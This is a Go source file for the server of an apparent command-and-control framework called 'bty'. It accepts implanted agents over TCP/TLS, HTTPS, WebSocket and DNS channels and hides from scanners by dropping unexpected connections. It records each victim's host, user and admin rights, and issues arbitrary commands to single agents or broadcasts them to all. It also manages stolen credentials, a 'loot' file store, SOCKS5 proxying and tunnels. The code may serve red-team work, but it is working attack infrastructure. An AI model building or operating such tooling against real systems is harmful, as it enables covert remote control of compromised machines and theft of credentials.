package c2

import (
	"context"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"bty/src/go/internal/config"
	"bty/src/go/internal/c2/session"
	"bty/src/go/internal/crypto"
	"bty/src/go/internal/db"
	"bty/src/go/internal/handlers"
	"bty/src/go/internal/proto"
	"bty/src/go/internal/transport"
	"bty/src/go/internal/module"
	"bty/src/go/internal/auth"
	"bty/src/go/internal/reporting"
	"bty/src/go/internal/siem"
	"bty/src/go/internal/logger"
	protobuf "google.golang.org/protobuf/proto"
)

// Server is the main C2 server.
type Server struct {
	cfg       *config.Config
	db        *db.DB
	tlsCert   tls.Certificate
	tlsConfig *tls.Config
	sessions  sync.Map

	// JWT authentication
	tokenManager *auth.TokenManager

	// RBAC
	rbac *auth.RBAC

	// Structured logger
	log *logger.Logger

	// mTLS
	caCert  *x509.Certificate
	caKey   *ecdsa.PrivateKey
	mtlsEnabled bool

	// Multi-transport listeners
	listeners []net.Listener

	// Operational features
	socks5      *SOCKS5Manager
	vault       *CredentialVault
	files       *FileManager
	portFwds    *PortFwdManager
	tunnels     *TunnelManager
	moduleStore *module.Store
	reporter    *reporting.ReportGenerator
	siem        *siem.SIEMForwarder

	// API server for graceful shutdown
	apiServer *http.Server
	apiMux    *http.ServeMux

	quit chan struct{}
	wg   sync.WaitGroup
}

// SetAPIMux sets a custom API mux (used to avoid circular imports).
func (s *Server) SetAPIMux(mux *http.ServeMux) { s.apiMux = mux }

// New creates a new C2 server.
func New(cfg *config.Config, database *db.DB) *Server {
	// Generate a random HMAC key for module verification at startup
	moduleHMACKey := make([]byte, 32)
	rand.Read(moduleHMACKey)

	// Load or create persistent JWT secret
	jwtSecret, err := database.GetSecret("jwt_signing_key")
	if err != nil {
		// Generate new secret and persist it
		jwtSecret = make([]byte, 32)
		rand.Read(jwtSecret)
		database.SetSecret("jwt_signing_key", jwtSecret)
		log.Println("[AUTH] Generated new JWT signing key")
	} else {
		log.Println("[AUTH] Loaded existing JWT signing key")
	}

	// Initialize mTLS CA
	caCert, caKey, err := crypto.GenerateCA()
	mtlsEnabled := false
	if err != nil {
		log.Printf("[MTLS] Warning: failed to generate CA: %v", err)
	} else {
		mtlsEnabled = true
		log.Println("[MTLS] Generated CA certificate for mutual TLS authentication")
	}

	return &Server{
		cfg:          cfg,
		db:           database,
		tokenManager: auth.NewTokenManager(jwtSecret, 12*time.Hour),
		rbac:         auth.NewRBAC(),
		log:          logger.New(logger.INFO, true),
		caCert:       caCert,
		caKey:        caKey,
		mtlsEnabled:  mtlsEnabled,
		socks5:       NewSOCKS5Manager(),
		vault:        NewCredentialVault(database),
		files:        NewFileManager("loot"),
		portFwds:     NewPortFwdManager(),
		tunnels:      NewTunnelManager(),
		moduleStore:  module.NewStore("modules", moduleHMACKey),
		reporter:     reporting.NewReportGenerator("reports"),
		siem:         siem.NewSIEMForwarder(1024),
		apiServer:    nil,
		quit:         make(chan struct{}),
	}
}

// Start begins listening on all configured transports.
func (s *Server) Start() error {
	// Generate TLS cert if needed
	if s.cfg.TLS.Enabled && s.cfg.TLS.AutoCert {
		cert, err := transport.GenerateSelfSignedCert(s.cfg.Server.Host)
		if err != nil {
			return fmt.Errorf("generate TLS cert: %w", err)
		}
		s.tlsCert = cert

		// Use mTLS if CA is available
		if s.mtlsEnabled && s.caCert != nil && s.caKey != nil {
			s.tlsConfig = crypto.NewMTLSServerConfig(cert, s.caCert)
			log.Printf("[MTLS] Mutual TLS enabled — agents require client certificates")
		} else {
			s.tlsConfig = transport.NewTLSConfig(cert)
		}
	}

	// Start REST API using modular handlers
	apiMux := s.setupAPI()
	apiAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.API.Port)
	apiServer := &http.Server{Addr: apiAddr, Handler: apiMux}
	s.apiServer = apiServer

	go func() {
		log.Printf("[API] Listening on %s", apiAddr)
		if err := apiServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("[API] Error: %v", err)
		}
	}()

	// Start TCP/TLS C2 listener
	tcpAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Server.Port)

	var tcpListener net.Listener
	var err error

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		tcpListener, err = tls.Listen("tcp", tcpAddr, s.tlsConfig)
		log.Printf("[TCP+TLS] Listening on %s", tcpAddr)
	} else {
		tcpListener, err = net.Listen("tcp", tcpAddr)
		log.Printf("[TCP] Listening on %s", tcpAddr)
	}

	if err != nil {
		return fmt.Errorf("TCP listen: %w", err)
	}
	s.listeners = append(s.listeners, tcpListener)
	s.wg.Add(1)
	go s.acceptLoop(tcpListener, "tcp")

	// Start HTTPS long-poll listener
	httpAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.HTTPPort)
	var httpListener *transport.HTTPListener

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		httpListener = transport.NewHTTPSListener(httpAddr, s.tlsConfig)
	} else {
		httpListener = transport.NewHTTPListener(httpAddr)
	}

	if err := httpListener.Start(); err != nil {
		log.Printf("[HTTP] Warning: failed to start: %v", err)
	} else {
		s.listeners = append(s.listeners, httpListener)
		s.wg.Add(1)
		go s.acceptLoop(httpListener, "http")
	}

	// Start WebSocket listener
	wsAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.WSPort)
	var wsListener *transport.WSListener

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		wsListener = transport.NewWSSListener(wsAddr, s.tlsConfig)
	} else {
		wsListener = transport.NewWSListener(wsAddr)
	}

	if err := wsListener.Start(); err != nil {
		log.Printf("[WS] Warning: failed to start: %v", err)
	} else {
		s.listeners = append(s.listeners, wsListener)
		s.wg.Add(1)
		go s.acceptLoop(wsListener, "ws")
	}

	// Start DNS listener if configured
	if s.cfg.Transport.DNSPort > 0 {
		dnsAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.DNSPort)
		dnsListener, err := transport.NewDNSListener(dnsAddr, s.cfg.Transport.DNSDomains, nil)
		if err != nil {
			log.Printf("[DNS] Warning: failed to start: %v", err)
		} else {
			dnsListener.Start()
			s.listeners = append(s.listeners, dnsListener)
			s.wg.Add(1)
			go s.acceptLoop(dnsListener, "dns")
		}
	}

	// Session cleanup goroutine
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.cleanupStaleSessions()
	}()

	return nil
}

func (s *Server) acceptLoop(listener net.Listener, transportName string) {
	defer s.wg.Done()

	for {
		select {
		case <-s.quit:
			return
		default:
		}

		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-s.quit:
				return
			default:
				continue
			}
		}

		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.handleConnection(conn, transportName)
		}()
	}
}

// Stop gracefully shuts down the server with a 30-second timeout.
func (s *Server) Stop() {
	log.Println("[C2] Shutting down all listeners...")
	close(s.quit)

	// Create a context with timeout for graceful shutdown
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Flush and stop SIEM forwarder
	if s.siem != nil {
		s.siem.Stop()
	}

	// Shutdown API server gracefully with context
	if s.apiServer != nil {
		s.apiServer.Shutdown(ctx)
	}

	// Close all listeners first
	for _, ln := range s.listeners {
		ln.Close()
	}

	// Clean up sessions without ranging while they're being modified
	s.sessions.Range(func(key, value interface{}) bool {
		if sess, ok := value.(*session.Session); ok {
			sess.Close()
		}
		return true
	})

	s.wg.Wait()
	log.Println("[C2] Server stopped")
}

// Accessors for modular handlers.

// Quit returns the quit channel for shutdown signaling.
func (s *Server) Quit() <-chan struct{} { return s.quit }

// TokenManager returns the JWT token manager.
func (s *Server) TokenManager() *auth.TokenManager { return s.tokenManager }

// RBAC returns the RBAC manager.
func (s *Server) RBAC() *auth.RBAC { return s.rbac }

// DB returns the database handle.
func (s *Server) DB() *db.DB { return s.db }

// SIEM returns the SIEM forwarder.
func (s *Server) SIEM() *siem.SIEMForwarder { return s.siem }

// ListenerCount returns the number of active listeners.
func (s *Server) ListenerCount() int { return len(s.listeners) }

// ModuleStore returns the module store.
func (s *Server) ModuleStore() *module.Store { return s.moduleStore }

// Sessions returns the sessions map.
func (s *Server) Sessions() *sync.Map { return &s.sessions }

// SOCKS5 returns the SOCKS5 manager.
func (s *Server) SOCKS5() *SOCKS5Manager { return s.socks5 }

// Vault returns the credential vault.
func (s *Server) Vault() *CredentialVault { return s.vault }

// Files returns the file manager.
func (s *Server) Files() *FileManager { return s.files }

// PortFwds returns the port forwarding manager.
func (s *Server) PortFwds() *PortFwdManager { return s.portFwds }

// Tunnels returns the tunnel manager.
func (s *Server) Tunnels() *TunnelManager { return s.tunnels }

// Reporter returns the report generator.
func (s *Server) Reporter() *reporting.ReportGenerator { return s.reporter }

// MTLSEnabled returns whether mTLS is enabled.
func (s *Server) MTLSEnabled() bool { return s.mtlsEnabled }

// CACert returns the CA certificate.
func (s *Server) CACert() *x509.Certificate { return s.caCert }

// CAKey returns the CA private key.
func (s *Server) CAKey() *ecdsa.PrivateKey { return s.caKey }

// Config returns the server configuration.
func (s *Server) Config() *config.Config { return s.cfg }

// CreateTask sends a command to an agent.
func (s *Server) CreateTask(agentID, command string, timeoutSec uint32) (*proto.TaskResult, error) {
	var sess *session.Session

	if val, ok := s.sessions.Load(agentID); ok {
		sess = val.(*session.Session)
	} else {
		s.sessions.Range(func(k, v interface{}) bool {
			s := v.(*session.Session)
			if s.AgentID == agentID || s.Hostname == agentID || s.ID == agentID {
				sess = s
				return false
			}
			return true
		})
	}

	if sess == nil {
		return nil, fmt.Errorf("agent not found: %s", agentID)
	}
	if !sess.IsActive() {
		return nil, fmt.Errorf("agent not active")
	}

	taskID := generateTaskID()
	task := &proto.Task{TaskId: taskID, Command: command, TimeoutSec: timeoutSec}

	s.db.InsertTask(&db.TaskRecord{
		ID: taskID, SessionID: sess.ID, Command: command, IssuedAt: time.Now(),
	})
	s.db.LogAction(0, "task", fmt.Sprintf("%s: %s", sess.Hostname, command))

	resultCh := sess.RegisterPendingTask(taskID)
	if err := sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task); err != nil {
		sess.ResolveTask(taskID, nil)
		return nil, fmt.Errorf("send: %w", err)
	}

	timeout := time.Duration(timeoutSec) * time.Second
	if timeout == 0 {
		timeout = 30 * time.Second
	}

	select {
	case result := <-resultCh:
		if result != nil {
			s.db.UpdateTaskResult(taskID, result.Output, int(result.ExitCode), result.Success)
		}
		return result, nil
	case <-time.After(timeout):
		sess.ResolveTask(taskID, nil)
		s.db.UpdateTaskResult(taskID, "timeout", -1, false)
		return nil, fmt.Errorf("task timed out")
	}
}

// BroadcastTask sends a command to all active sessions.
func (s *Server) BroadcastTask(command string) map[string]*proto.TaskResult {
	results := make(map[string]*proto.TaskResult)
	var mu sync.Mutex
	var wg sync.WaitGroup

	s.sessions.Range(func(key, value interface{}) bool {
		sess := value.(*session.Session)
		if !sess.IsActive() {
			return true
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			result, err := s.CreateTask(sess.ID, command, 30)
			mu.Lock()
			if err != nil {
				results[sess.ID] = &proto.TaskResult{TaskId: sess.ID, Success: false, ErrorMessage: err.Error()}
			} else {
				results[sess.ID] = result
			}
			mu.Unlock()
		}()
		return true
	})

	wg.Wait()
	return results
}

// ActiveSessions returns the count of active sessions.
func (s *Server) ActiveSessions() int {
	count := 0
	s.sessions.Range(func(key, value interface{}) bool {
		if value.(*session.Session).IsActive() {
			count++
		}
		return true
	})
	return count
}

// KillAgent kills a specific agent session.
func (s *Server) KillAgent(agentID string) error {
	val, ok := s.sessions.Load(agentID)
	if !ok {
		return fmt.Errorf("agent not found")
	}
	sess := val.(*session.Session)
	sess.SetState(session.StateKilled)
	sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT, nil)
	sess.Close()
	s.db.UpdateSessionState(sess.ID, "killed")

	s.siem.Forward(siem.SIEMEvent{
		EventType: "agent_killed",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"session_id": sess.ID,
			"agent_id":   sess.AgentID,
			"hostname":   sess.Hostname,
		},
	})

	return nil
}

// --- Connection handler ---

func (s *Server) handleConnection(conn net.Conn, transportName string) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()

	// Read first 4 bytes to validate protocol (length-prefixed message)
	peek := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, err := conn.Read(peek)
	conn.SetReadDeadline(time.Time{})

	// Reject non-BTY protocol connections (browsers, scanners, TLS handshakes)
	if err != nil || n < 4 || peek[0] == 0x16 || peek[0] == 0x47 || peek[0] == 0x50 {
		if peek[0] == 0x16 {
			// TLS ClientHello — silently drop
			return
		}
		return
	}

	// Validate length prefix is reasonable (1 byte to 100 MB)
	msgLen := binary.BigEndian.Uint32(peek)
	if msgLen < 10 || msgLen > 100*1024*1024 {
		return
	}

	// Prepend peek bytes back for the session reader
	conn = &peekConn{Conn: conn, peek: peek[:n]}

	log.Printf("[C2/%s] New connection from %s", transportName, remoteAddr)

	sess := session.NewSession(conn, transportName)
	sess.SetState(session.StateKeyExchange)

	if err := s.handleKeyExchange(sess); err != nil {
		log.Printf("[C2/%s] Key exchange failed: %v", transportName, err)
		return
	}

	if err := s.handleSessionInit(sess); err != nil {
		log.Printf("[C2/%s] Session init failed: %v", transportName, err)
		return
	}

	log.Printf("[C2/%s] Session established: %s (%s@%s)",
		transportName, sess.ID, sess.Username, sess.Hostname)

	s.db.UpsertSession(&db.SessionRecord{
		ID: sess.ID, AgentID: sess.AgentID, Hostname: sess.Hostname,
		OS: sess.OS, Arch: sess.Arch, Username: sess.Username,
		IsAdmin: sess.IsAdmin, State: "active", LastSeen: time.Now(),
	})
	s.db.LogAction(0, "session", fmt.Sprintf("%s via %s", sess.Hostname, transportName))

	// Forward session establishment to SIEM
	s.siem.Forward(siem.SIEMEvent{
		EventType: "session_established",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"session_id": sess.ID,
			"agent_id":   sess.AgentID,
			"hostname":   sess.Hostname,
			"os":         sess.OS,
			"arch":       sess.Arch,
			"username":   sess.Username,
			"is_admin":   sess.IsAdmin,
			"transport":  transportName,
		},
	})

	s.sessions.Store(sess.ID, sess)
	sess.SetState(session.StateActive)

	s.handleMessageLoop(sess)

	s.db.UpdateSessionState(sess.ID, "disconnected")
	log.Printf("[C2/%s] Session ended: %s", transportName, sess.ID)
}

func (s *Server) handleKeyExchange(sess *session.Session) error {
	serverKP, err := crypto.GenerateKeyPair()
	if err != nil {
		return fmt.Errorf("keypair: %w", err)
	}
	sess.KeyPair = serverKP

	inner, err := sess.RecvRaw()
	if err != nil {
		return fmt.Errorf("recv: %w", err)
	}

	if inner.Type != proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE {
		return fmt.Errorf("expected KEY_EXCHANGE")
	}

	agentKE := inner.GetKeyExchange()
	if len(agentKE.PublicKey) != crypto.KeySize {
		return fmt.Errorf("invalid key size")
	}

	var agentPub [crypto.KeySize]byte
	copy(agentPub[:], agentKE.PublicKey)

	shared, err := crypto.DeriveSharedSecret(&serverKP.PrivateKey, &agentPub)
	if err != nil {
		return fmt.Errorf("shared secret: %w", err)
	}

	salt, _ := crypto.GenerateSalt()
	encKey, hmacKey, sessionToken, err := crypto.DeriveSessionKeys(shared, salt)
	if err != nil {
		return fmt.Errorf("derive keys: %w", err)
	}

	sess.EncKey = encKey
	sess.HmacKey = hmacKey
	sess.SessionToken = sessionToken

	serverInner := &proto.EnvelopeInner{
		Id:        2,
		Type:      proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp: uint64(time.Now().UnixNano()),
		Payload:   &proto.EnvelopeInner_KeyExchange{KeyExchange: &proto.KeyExchange{
			PublicKey: serverKP.PublicKey[:], Padding: salt,
		}},
	}
	innerBytes, _ := protobuf.Marshal(serverInner)

	return sess.SendRaw(&proto.Envelope{
		Id: 2, Type: proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp:  serverInner.Timestamp,
		Nonce:      make([]byte, crypto.NonceSize),
		Ciphertext: innerBytes,
	})
}

func (s *Server) handleSessionInit(sess *session.Session) error {
	inner, err := sess.RecvRaw()
	if err != nil {
		return fmt.Errorf("recv: %w", err)
	}

	if inner.Type != proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT {
		return fmt.Errorf("expected SESSION_INIT")
	}

	init := inner.GetSessionInit()
	sess.Hostname = init.Hostname
	sess.OS = init.Os
	sess.Arch = init.Arch
	sess.Username = init.Username
	sess.IsAdmin = init.IsAdmin
	sess.AgentID = init.AgentId
	sess.AgentVersion = init.AgentVersion

	ack := &proto.Acknowledge{AckId: inner.Id, Success: true}
	return sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_ACK, ack)
}

func (s *Server) handleMessageLoop(sess *session.Session) {
	for {
		select {
		case <-s.quit:
			return
		default:
		}

		inner, err := sess.RecvEnvelope()
		if err != nil {
			log.Printf("[C2] Session %s read error: %v", sess.ID, err)
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_error",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID, "error": err.Error()},
			})
			sess.Close()
			return
		}

		switch inner.Type {
		case proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT:
			sess.Touch()
			s.db.UpdateSessionLastSeen(sess.ID)

		case proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT:
			if result := inner.GetTaskResult(); result != nil {
				// Check for tunnel results
				if strings.HasPrefix(result.Output, "tunnel_") {
					s.tunnels.HandleTunnelResult(result)
				}
				sess.ResolveTask(result.TaskId, result)

				// Forward task result to SIEM
				s.siem.Forward(siem.SIEMEvent{
					EventType: "task_result",
					Source:    "c2_server",
					Data: map[string]interface{}{
						"session_id": sess.ID,
						"task_id":    result.TaskId,
						"success":    result.Success,
						"exit_code":  result.ExitCode,
					},
				})
			}

		case proto.EnvelopeType_ENVELOPE_TYPE_RECONNECT:
			sess.SetState(session.StatePassive)
			s.db.UpdateSessionState(sess.ID, "passive")
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_passive",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID},
			})

		case proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT:
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_disconnect",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID},
			})
			sess.Close()
			return
		}
	}
}

func (s *Server) cleanupStaleSessions() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-s.quit:
			return
		case <-ticker.C:
			s.sessions.Range(func(key, value interface{}) bool {
				sess := value.(*session.Session)
				if sess.IsStale(s.cfg.Server.SessionTimeout) {
					sess.Close()
				}
				return true
			})
		}
	}
}

// --- REST API ---

func (s *Server) setupAPI() *http.ServeMux {
	router := handlers.NewRouter(s)
	mux := router.Setup()

	// Serve SPA frontend from web/dist/ if it exists
	distPath := s.findWebDist()
	if distPath != "" {
		fileServer := http.FileServer(http.Dir(distPath))
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			if strings.HasPrefix(r.URL.Path, "/api/") {
				http.NotFound(w, r)
				return
			}
			path := filepath.Join(distPath, filepath.Clean(r.URL.Path))
			if _, err := os.Stat(path); err == nil {
				fileServer.ServeHTTP(w, r)
				return
			}
			http.ServeFile(w, r, filepath.Join(distPath, "index.html"))
		})
		log.Printf("[WEB] Serving SPA from %s", distPath)
	}

	return mux
}

func (s *Server) findWebDist() string {
	candidates := []string{
		"web/dist",
		"../../web/dist",
		"../../../web/dist",
	}
	for _, p := range candidates {
		if info, err := os.Stat(filepath.Join(p, "index.html")); err == nil && !info.IsDir() {
			abs, _ := filepath.Abs(p)
			return abs
		}
	}
	return ""
}

func generateTaskID() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("task-%x", time.Now().UnixNano())
	}
	return fmt.Sprintf("task-%x", b)
}

// peekConn wraps a net.Conn with pre-read bytes.
type peekConn struct {
	net.Conn
	peek []byte
	pos  int
}

func (c *peekConn) Read(b []byte) (int, error) {
	if c.pos < len(c.peek) {
		n := copy(b, c.peek[c.pos:])
		c.pos += n
		return n, nil
	}
	return c.Conn.Read(b)
}
